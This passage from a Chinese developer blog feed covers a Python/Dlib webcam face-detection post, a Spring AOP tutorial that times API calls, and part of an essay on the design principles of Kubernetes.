&lt;span&gt;102&lt;/span&gt;     cv2.namedWindow(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;camera&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, 1&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;103&lt;/span&gt;     cv2.imshow(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;camera&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, img_rd)
&lt;/span&gt;&lt;span&gt;104&lt;/span&gt; 
&lt;span&gt;105&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 释放摄像头&lt;/span&gt;
&lt;span&gt;106&lt;/span&gt; &lt;span&gt;cap.release()
&lt;/span&gt;&lt;span&gt;107&lt;/span&gt; 
&lt;span&gt;108&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除建立的窗口&lt;/span&gt;
&lt;span&gt;109&lt;/span&gt; cv2.destroyAllWindows()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这个代码就是把之前做的人脸检测，图像拼接几个结合起来，代码量也很少，只有100行，如有问题可以参考之前博客：&lt;/p&gt;
&lt;p&gt;　　&lt;a title=&quot;Python 3 利用 Dlib 19.7 进行人脸检测&quot; href=&quot;https://www.cnblogs.com/AdaminXie/p/7905888.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/AdaminXie/p/7905888.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;a title=&quot;Python 3 利用 Dlib 实现人脸检测和剪切&quot; href=&quot;https://www.cnblogs.com/AdaminXie/p/8339863.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/AdaminXie/p/8339863.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;# 请尊重他人劳动成果，转载或者使用源码请注明出处：&lt;/strong&gt;&lt;a title=&quot;xie&quot; href=&quot;http://www.cnblogs.com/AdaminXie/&quot; target=&quot;_blank&quot;&gt;http://www.cnblogs.com/AdaminXie&lt;/a&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#&lt;/strong&gt; &lt;strong&gt;如果对您有帮助，欢迎在 GitHub 上 Star 支持下: &lt;a title=&quot;Dlib_face_cut&quot; href=&quot;https://github.com/coneypo/Dlib_face_cut&quot; target=&quot;_blank&quot;&gt;https://github.com/coneypo/Dlib_face_cut&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;# 如有问题请留言或者联系邮箱 &lt;a href=&quot;mailto:coneypo@foxmail.com&quot;&gt;coneypo@foxmail.com&lt;/a&gt;，商业合作勿扰&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 13:54:00 +0000</pubDate>
<dc:creator>coneypo</dc:creator>
<og:description>调用摄像头，进行实时人脸检测和平铺显示</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/AdaminXie/p/10317066.html</dc:identifier>
</item>
<item>
<title>浅谈SpringAOP - wenbochang</title>
<link>http://www.cnblogs.com/wenbochang/p/10316900.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wenbochang/p/10316900.html</guid>
<description>&lt;h2&gt;0. 写在最前面&lt;/h2&gt;
&lt;p&gt;之前实习天天在写业务，其中有一个业务是非常的复杂，涉及到了特别多的表。最后测下来，一个接口的时间，竟然要5s多。&lt;/p&gt;
&lt;p&gt;当时想写一个AOP，来计算处理接口花费多长时间，也就是在业务逻辑的前面计算开始的时间，业务逻辑后面计算结束的时间，一相减即可。&lt;/p&gt;
&lt;p&gt;但我发觉我竟然忘记怎么写了，哎，没办法，在此纪录，重新捡回吧。&lt;/p&gt;

&lt;h2&gt;1. 什么AOP&lt;/h2&gt;
&lt;blockquote readability=&quot;26&quot;&gt;
&lt;p&gt;AOP(Aspect-Oriented Programming, 面向切面编程): 是一种新的方法论, 是对传统 OOP(Object-Oriented Programming, 面向对象编程) 的补充.&lt;/p&gt;
&lt;p&gt;AOP 的主要编程对象是切面(aspect), 而切面模块化横切关注点.&lt;/p&gt;
&lt;p&gt;在应用 AOP 编程时, 仍然需要定义公共功能, 但可以明确的定义这个功能在哪里, 以什么方式应用, 并且不必修改受影响的类. 这样一来横切关注点就被模块化到特殊的对象(切面)里.&lt;/p&gt;
&lt;p&gt;AOP 的好处: 每个事物逻辑位于一个位置, 代码不分散, 便于维护和升级 业务模块更简洁, 只包含核心业务代码.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;简单来说，AOP就是在不影响现有的业务逻辑下面，在业务前面后面织入一些其他逻辑。比如，日志，验证等等&lt;/strong&gt;&lt;/p&gt;

&lt;h2&gt;2. SpringAOP有哪几种&lt;/h2&gt;
&lt;ul class=&quot;ul-list&quot; data-mark=&quot;-&quot; readability=&quot;4.5&quot;&gt;&lt;li class=&quot;md-list-item md-focus-container&quot; readability=&quot;0&quot;&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;@Before:&lt;/strong&gt; &lt;span&gt;前置通知, 在方法执行之前执行&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;0&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;@After:&lt;/strong&gt; &lt;span&gt;后置通知, 在方法执行之后执行&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;0&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;@AfterRunning:&lt;/strong&gt; &lt;span&gt;返回通知, 在方法返回结果之后执行&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;0&quot;&gt;
&lt;p class=&quot;md-end-block&quot;&gt;&lt;span&gt;&lt;strong&gt;@AfterThrowing:&lt;/strong&gt; &lt;span&gt;异常通知, 在方法抛出异常之后&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&quot;md-list-item&quot; readability=&quot;0&quot;&gt;
&lt;p class=&quot;md-end-block md-focus&quot;&gt;&lt;span&gt;&lt;strong&gt;@Around:&lt;/strong&gt; &lt;span&gt;环绕通知, 围绕着方法执行&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;假设我们现在有一个接口如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; @RequestMapping(&quot;/aa&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;public&lt;/span&gt;&lt;span&gt; String a() {
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;     Person person = &lt;span&gt;new&lt;/span&gt; Person(&quot;zhangsan&quot;, 18&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     redisService.put(&quot;person&quot;&lt;span&gt;, person);
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;     Person ps = redisService.get(&quot;person&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt;&lt;span&gt; ps.toString();
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;现在产品提了一个需求，&lt;strong&gt;我想在这段业务执行前，打印一句话，结束后在打印一句话。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;很简单，我们直接改业务代码就行了，一个可以两个可以，但是多了呢，很严重影响业务逻辑，&lt;strong&gt;此时就可以用到了前置通知和后置通知。&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; @Pointcut(value = &quot;execution (public * com.test.mybatis.demo.web.DepartmentController.*(..))&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCut() { }
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt; @Before(value = &quot;pointCut()&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; beforeMethod(JoinPoint joinPoint) {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     String methodName =&lt;span&gt; joinPoint.getSignature().getName();
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     List&amp;lt;Object&amp;gt; args =&lt;span&gt; Lists.newArrayList(joinPoint.getArgs());
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     log.info(&quot;The method [&quot; + methodName + &quot;] begins with &quot; +&lt;span&gt; args);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt; @After(value = &quot;pointCut()&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; afterMethod(JoinPoint joinPoint) {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     String methodName =&lt;span&gt; joinPoint.getSignature().getName();
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     log.info(&quot;The method [&quot; + methodName + &quot;] ends&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;解释下这段代码。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;PointCut&lt;/span&gt;&lt;/strong&gt; 简称切点，也就是一个表达式，我要在哪些接口上进行拦截，进行一个配置。他有他自己的一套规范，我们按照他的规范来就好了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-expand&quot;&gt;&lt;strong&gt;&lt;span&gt;JoinPoint&lt;/span&gt;&lt;/strong&gt; &lt;span class=&quot;md-expand&quot;&gt;简称连接点。程序执行的某个特定位置：如类某个方法调用前、调用后、方法抛出异常后等。&lt;strong&gt;JoinPoint&lt;/strong&gt; 我可以获取到方法名，参数等等。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;@Before，@After&lt;/strong&gt; 一个是前置通知，一个是后置通知&lt;/p&gt;
&lt;p&gt; 此时我再访问这个接口的时候，他的执行流程如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; beforeMethod  ==&amp;gt;  业务逻辑  ==&amp;gt;  afterMethod&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;是不是非常的神奇，AOP的实现方式可以看我这边博文：&lt;a href=&quot;https://www.cnblogs.com/wenbochang/p/8899626.html&quot;&gt;动态代理两种实现方式&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt; 3. 回到我们的最初&lt;/h2&gt;
&lt;p&gt;如何计算一个接口耗时多少呢？&lt;/p&gt;
&lt;p&gt;起初我想到可以用前置 + 后置 来做，但最后相减，变量怎么传递不好搞。想过用全局变量，但并发会出现问题。&lt;/p&gt;
&lt;p&gt;此时我想到了很少用的&lt;strong&gt;环绕通知&lt;/strong&gt;，最后代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; @Around(&quot;pointCut()&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object aroundMethod(ProceedingJoinPoint joinPoint) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     Object res = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     String methodName =&lt;span&gt; joinPoint.getSignature().getName();
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 前置通知&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;         Stopwatch stopwatch =&lt;span&gt; Stopwatch.createStarted();
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 执行目标方法&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;         res =&lt;span&gt; joinPoint.proceed();
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 后置通知&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;long&lt;/span&gt; duration =&lt;span&gt; stopwatch.elapsed(TimeUnit.MILLISECONDS);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;         log.info(&quot;{} 执行时长： {}&quot;&lt;span&gt;, methodName, duration);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable throwable) {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        throwable.printStackTrace();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt;&lt;span&gt; res;
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;每次执行一个方法，他都会将你的执行时间打印出来。结果如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 前置通知&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; 2019-01-24 21:17:52.802  INFO 224 --- [nio-8080-exec-5&lt;span&gt;] com.test.mybatis.demo.AOP.TestAOP        : The method [testAOP] begins
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 业务逻辑&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt; &lt;span&gt;这里是业务逻辑
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 环绕通知&lt;/span&gt;
&lt;span&gt;6&lt;/span&gt; 2019-01-24 21:17:53.303  INFO 224 --- [nio-8080-exec-5] com.test.mybatis.demo.AOP.TestAOP        : testAOP 执行时长： 500
&lt;span&gt;7&lt;/span&gt; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 后置通知&lt;/span&gt;
&lt;span&gt;8&lt;/span&gt; 2019-01-24 21:17:53.303  INFO 224 --- [nio-8080-exec-5] com.test.mybatis.demo.AOP.TestAOP        : The method [testAOP] ends
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt; &lt;/h2&gt;
&lt;h2&gt;4. 写在最后&lt;/h2&gt;
&lt;p&gt;最后我想将这个计算接口时间的AOP定义成一个注解，只要我在接口上加这个注解，他就会打印时间，否则就不打印。&lt;/p&gt;
&lt;p&gt;这是后期的一个目标。共勉&lt;/p&gt;

</description>
<pubDate>Thu, 24 Jan 2019 13:23:00 +0000</pubDate>
<dc:creator>wenbochang</dc:creator>
<og:description>0. 写在最前面 之前实习天天在写业务，其中有一个业务是非常的复杂，涉及到了特别多的表。最后测下来，一个接口的时间，竟然要5s多。 当时想写一个AOP，来计算处理接口花费多长时间，也就是在业务逻辑的前</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wenbochang/p/10316900.html</dc:identifier>
</item>
<item>
<title>朱晔的互联网架构实践心得S2E3：品味Kubernetes的设计理念 - lovecindywang</title>
<link>http://www.cnblogs.com/lovecindywang/p/10316898.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lovecindywang/p/10316898.html</guid>
<description>&lt;p&gt;Kubernetes（k8s）是一款开源的优秀的容器编排调度系统，其本身也是一款分布式应用程序。虽然本系列文章讨论的是互联网架构，但是k8s的一些设计理念非常值得深思和借鉴，本人并非运维专家，本文尝试从自己看到的一些k8s的架构理念结合自己的理解来分析 k8s在稳定性、简单、可扩展性三个方面做的一些架构设计的考量。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;稳定性：考虑的是系统本身足够稳定，用户使用系统做的一些动作能够稳定落地，系统本身容错性足够强可以应对网络问题，系统本身有足够的高可用等等。&lt;/li&gt;
&lt;li&gt;简单：考虑的是系统本身的设计足够简单，组件之间没有太多耦合，组件职责单一等等。&lt;/li&gt;
&lt;li&gt;可扩展性：考虑的是系统的各个模块有层次，模块对内对外一视同仁，外部可以轻易实现扩展模块插入到系统（插件），模块实现统一的接口便于替换切换具体实现等等。&lt;br/&gt;下面，针对这三方面我们都会来看一些k8s设计的例子，在看k8s是怎么做的同时我们可以自己思考一下，如果我们需要研发的一款产品就是类似于k8s这样的需要高可靠的资源状态管理协调系统，我们会怎么来设计呢？&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;稳定声明式应用程序管理&quot;&gt;1、稳定：声明式应用程序管理&lt;/h2&gt;
&lt;p&gt;我们知道，k8s定义了许多资源（比如&lt;code&gt;Pod、Service、Deployment、ReplicaSet、StatefulSet、Job、CronJob&lt;/code&gt;等），在管理资源的时候我们使用声明式的配置（JSON、YAML等）来对资源进行增删改查操作。我们提供的这些配置就是描述我们希望这些资源最终达成的一个目标状态，叫做Spec，k8s会对观察资源得到资源的状态，叫做Status，当Spec!=Status的时候，k8s的各种控制管理程序就会起作用，进行各种操作使得资源最终可以达到我们期望的Spec。这种声明式的管理方式和命令式管理方式相比，虽然没有后者这么直接，但是容错性会很强，后面一节会进一步详细提到这点。而且，这种管理方式非常的简洁，只要用户提供合适的Spec定义即可，并不需要对外暴露几十个几百个不同的API来实现对资源的各个方面做改变。当然，我们也可以灵活的对一些重要的动作单独开辟管理API（比如扩容，比如修改镜像），这些API底层做的操作就是修改Spec，底层是统一的。&lt;/p&gt;
&lt;p&gt;在之前第一季的系列文章S1E2中，我分享过任务表的设计，其实这里的声明式对象管理就是类似这样的思想，我们在数据库中保存的是我们要的结果，然后由不同的任务Job来进行处理最终实现这样的结果（同时也会保存组件当前的状态到数据库），即使任务执行失败也无妨，后续的任务会继续重试，这种方式是可靠性最高的。&lt;/p&gt;
&lt;h2 id=&quot;稳定边缘触发-vs-水平触发&quot;&gt;2、稳定：边缘触发 vs 水平触发&lt;/h2&gt;
&lt;p&gt;K8s使用的是声明式的管理方式，也就是水平触发。另一种做法是叫做命令式的管理，也就是边缘触发。比如我们在做支付系统，用户充值100元，提现100元然后又充值100元，对于命令式管理就是三条命令。如果提现请求丢失了，用户账户的余额就出错了，这肯定是不能接受的，命令式管理或边缘触发一定需要配合补偿。而声明式的管理就是告诉系统，用户在进行了三次操作后的余额分别是100、0和100，最终就是100，即使提现请求丢失了，最终用户的余额就是100。&lt;/p&gt;
&lt;p&gt;来看下下图的例子，在网络良好的情况下，边缘触发没任何问题。我们进行了开、关、开三次操作，最后的状态是0。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ff3cf8ab8477?w=830&amp;amp;h=492&amp;amp;f=png&amp;amp;s=142558&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在网络出现问题的时候，丢失了关这个操作，对于边缘触发，最终停留在了2这个错误的状态。对于水平触发没有这个问题，虽然当中有一段时间网络不好，状态错误停留在了1，但是网络恢复后我们马上可以感知到当前的状态应该是0，状态又能回到0，最终状态也能回到正确的1。试想一下，如果我们对我们的Pod进行扩容缩容，如果每次告知k8s应该增加或减少多少个Pod（的这种命令式方式），最终很可能因为网络问题，Pod的状态不是我们期望的。更好的做法是告诉k8s我们希望的状态，不管现在网络是否有问题，某个管理组件是否有问题，pod是否有问题，最终我们期望k8s帮我们调整到我们期望的状态，宁可慢也不要错。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ff400f507a33?w=830&amp;amp;h=778&amp;amp;f=png&amp;amp;s=234678&quot;/&gt;&lt;br/&gt;（图来自&lt;a href=&quot;https://hackernoon.com/level-triggering-and-reconciliation-in-kubernetes-1f17fe30333d&quot;&gt;这里&lt;/a&gt;）&lt;/p&gt;
&lt;h2 id=&quot;稳定高可用设计&quot;&gt;3、稳定：高可用设计&lt;/h2&gt;
&lt;p&gt;我们知道etcd是基于Raft协议的分布式键值数据库/协调系统，本身推荐使用3、5、7这样奇数节点构成集群实现高可用。对于Master节点，我们可以在每一个节点都部署一个etcd，这样节点上的API Server可以和本地的etcd直接通讯，而API Server因为是轻（无）状态的，所以可以在之前使用负载均衡器做代理，不管是Node节点也好还是客户端也好都可以由负载均衡分发请求到合适的API Server上。对于类似于Job的Controller Manager以及Scheduler，显然不适合多个节点同时运行，所以它们都会采用抢占方式选举Leader，只有Leader能承担工作任务，Follower都处于待机状态。整体结构如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687fff94a15848a?w=982&amp;amp;h=709&amp;amp;f=png&amp;amp;s=71395&quot;/&gt;&lt;br/&gt;我们可以想一下其它一些分布式系统的高可用方案，以及我们自己设计的系统的高可用方案，无非就是这三种大模式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;无状态多节点 + 负载均衡&lt;/li&gt;
&lt;li&gt;有状态的主节点 + 从（或备份）节点&lt;/li&gt;
&lt;li&gt;对称同步的有状态多节点&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;简单基于list-watch的发布订阅&quot;&gt;4、简单：基于list-watch的发布订阅&lt;/h2&gt;
&lt;p&gt;通过前面的介绍我们大概知道了k8s的一个设计原则是etcd会处于API Server之后，集群内的各种组件是无法直接和数据库对话的，不仅仅因为把数据库直接暴露给各组件会特别混乱，更重要的是谁都可以直接读写etcd会非常不安全，需要统一经过API Server做身份认证和鉴权等安全控制（后面我们会提到API Server的插件链）。&lt;/p&gt;
&lt;p&gt;对于k8s集群内的各种资源，k8s的控制管理器和调度器需要感知到各种资源的状态变化（比如创建），然后根据变化事件履行自己的管理职责。考虑到解耦，显然这里有MQ的需求，各种管理组件可以监听各种资源的状态变化事件，不需要相互感知到对方的存在，自己做自己的事情即可。如果k8s还依赖一些消息中间件实现这个功能，那么整体的复杂度会上升，而且还需要对消息中间件进行一些安全方面的定制。&lt;/p&gt;
&lt;p&gt;K8s给出的实现方式是仍然使用API Server来充当简单的消息总线的角色，所有的组件通过watch机制建立HTTP长链接来随时获悉自己感兴趣的资源的变化事件，完成自己的功能后还是调用API Server来写入我们组件新的Spec，这份Spec会被其它管理程序感知到并且进行处理。Watch的机制是推的机制，可以实时对变化进行处理，但是我们知道考虑到网络等各种因素，事件可能丢失，组件可能重启，这个时候我们需要推拉结合进行补偿，因此API Server还提供了List接口，用于在watch出现错误的时候或是组件重启的时候同步一次最新状态。通过推拉结合的list-watch机制满足了时效性需求和可靠性需求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687fffdf7da7dc3?w=1105&amp;amp;h=731&amp;amp;f=png&amp;amp;s=68743&quot;/&gt;&lt;br/&gt;我们来看一下这个图，这个图展示了客户端创建一个Deployment后k8s大概的工作过程：&lt;br/&gt;组件初始化阶段：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Deployment Controller订阅Deployment创建事件&lt;/li&gt;
&lt;li&gt;ReplicaSet Controller订阅ReplicaSet创建事件&lt;/li&gt;
&lt;li&gt;Scheduler订阅未绑定Node的Pod创建事件&lt;/li&gt;
&lt;li&gt;所有Kubelet订阅自己节点的Node和Pod绑定事件&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;集群资源变更操作：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;客户端调用API Server创建Deployment Spec&lt;/li&gt;
&lt;li&gt;Deployment Controller收到消息需要处理新的Deployment&lt;/li&gt;
&lt;li&gt;Deployment Controller调用API Server创建ReplicaSet&lt;/li&gt;
&lt;li&gt;ReplicaSet Controller收到消息需要处理新的ReplicaSet&lt;/li&gt;
&lt;li&gt;ReplicaSet Controller调用API Server创建Pod&lt;/li&gt;
&lt;li&gt;Scheduler收到消息，需要处理的新的Pod&lt;/li&gt;
&lt;li&gt;Scheduler经过处理后决定把这个Pod绑定到Node1，调用API Server写入绑定&lt;/li&gt;
&lt;li&gt;Node1上的Kubelet收到事消息需要处理Pod的部署&lt;/li&gt;
&lt;li&gt;Node1上的Kubelet根据Pod的Spec进行Pod部署&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;可以看到基于list-watch的API Server实现了简单可靠的消息总线的功能，基于资源消息的事件链，解耦了各组件之间的耦合，配合之前提到的基于声明式的对象管理又确保了管理稳定性。从层次上来说，master的组件都是控制面的组件，用来控制管理集群的状态，node的组件是执行面的组件，kubelet是一个无脑执行者的角色，它们的交流桥梁是API Server的各种事件，kubelet是无法感知到控制器的存在的。&lt;/p&gt;
&lt;h2 id=&quot;简单api-sever收敛资源管理入口&quot;&gt;5、简单：API Sever收敛资源管理入口&lt;/h2&gt;
&lt;p&gt;如下图所示，API Server实现了基于插件+过滤器链的方式（比如我们熟知的Spring MVC的拦截器链）来实现资源管理操作的前置校验（身份认证、授权、准入等等）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ffe7f382fa75?w=1334&amp;amp;h=524&amp;amp;f=png&amp;amp;s=66778&quot;/&gt;&lt;br/&gt;整个流程会有哪些环节呢：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;身份认证，根据各种插件确定来者是谁&lt;/li&gt;
&lt;li&gt;授权，根据各种插件确定用户是否有资格可以操作请求的资源&lt;/li&gt;
&lt;li&gt;默认值和转换，资源默认值设置，客户端到etcd版本号转换&lt;/li&gt;
&lt;li&gt;管理控制，根据各种插件执行资源的验证或修改操作，先修改后验证&lt;/li&gt;
&lt;li&gt;验证，根据各种验证规则验证每一个字段有效性&lt;/li&gt;
&lt;li&gt;幂等和并发控制，使用乐观并发方式（版本号方式）验证资源尚未被并发修改&lt;/li&gt;
&lt;li&gt;审计，记录所有资源变更日志&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如果是删除资源，还会有额外的一些环节：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;优雅关闭&lt;/li&gt;
&lt;li&gt;终接器钩子，可以配置一些终接器，在这个时候回调&lt;/li&gt;
&lt;li&gt;垃圾回收，级联删除没有引用根的资源&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;对于复杂的流程式的操作，采用职责链+处理链+插件的方式来实现是很常见的做法。你可能会说这个API Server的设计总体上就不简单，怎么有这么多环节，其实这才是最简单的做法，每一个环节都有独立的插件来运作（插件可以独立更新升级，也可以根据需求动态插拔配置），每一个插件只是做自己应该做的事情，如果没有这样的设计，恐怕会出现1万行代码的一个大方法。&lt;/p&gt;
&lt;h2 id=&quot;简单scheduler的设计&quot;&gt;6、简单：Scheduler的设计&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/16880022baa3f417?w=1360&amp;amp;h=618&amp;amp;f=png&amp;amp;s=43884&quot;/&gt;&lt;br/&gt;如图所示，类似于API Server的链式设计，Scheduler在做Pod调度算法的时候也采用了链式设计：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;待调度的Pod本身有一个优先级的概念，优先级高的先调度&lt;/li&gt;
&lt;li&gt;先找出所有的可用节点&lt;/li&gt;
&lt;li&gt;使用predicate（过滤器）筛选节点&lt;/li&gt;
&lt;li&gt;使用priority（排序器）对节点进行排序&lt;/li&gt;
&lt;li&gt;选择最大优先级的节点调度给Pod&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;常见的predicate算法有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;端口冲突监测&lt;/li&gt;
&lt;li&gt;资源是否满足&lt;/li&gt;
&lt;li&gt;亲和性考量&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;常见的priority算法有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;网络拓扑临近&lt;/li&gt;
&lt;li&gt;平衡资源使用&lt;/li&gt;
